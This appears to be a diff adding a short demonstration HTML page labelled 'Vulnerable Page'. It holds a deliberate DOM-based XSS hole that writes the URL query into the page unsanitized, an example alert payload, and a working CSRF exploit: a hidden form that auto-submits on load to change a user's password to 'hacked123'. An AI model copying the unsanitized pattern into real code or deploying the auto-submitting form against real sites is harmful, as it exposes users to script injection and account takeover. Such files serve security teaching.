@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vulnerable Page</title>
+</head>
+<body>
+
+    <h1>Welcome to the Vulnerable Page</h1>
+
+    <!-- 🚨 XSS Vulnerability: User input is directly inserted into the page without sanitization -->
+    <p>Search results for: <script>document.write(decodeURIComponent(location.search.split('=')[1]));</script></p>
+
+    <!-- 🚨 CSRF Attack: Auto-submitting a malicious form to change a user's password -->
+    <form id="csrfForm" action="http://vulnerable-site.com/change-password" method="POST">
+        <input type="hidden" name="new_password" value="hacked123">
+        <input type="hidden" name="confirm_password" value="hacked123">
+    </form>
+
+    <script>
+        // 🚨 XSS Payload Example: Malicious JavaScript execution
+        // If a user visits: vulnerable-site.com/?query=<script>alert('XSS')</script>
+        // The script will execute and display an alert box
+
+        // 🚨 CSRF Exploit: Auto-submits the form if the user is logged into vulnerable-site.com
+        window.onload = function() {
+            document.getElementById('csrfForm').submit();
+        };
+    </script>
+
+</body>
+</html>
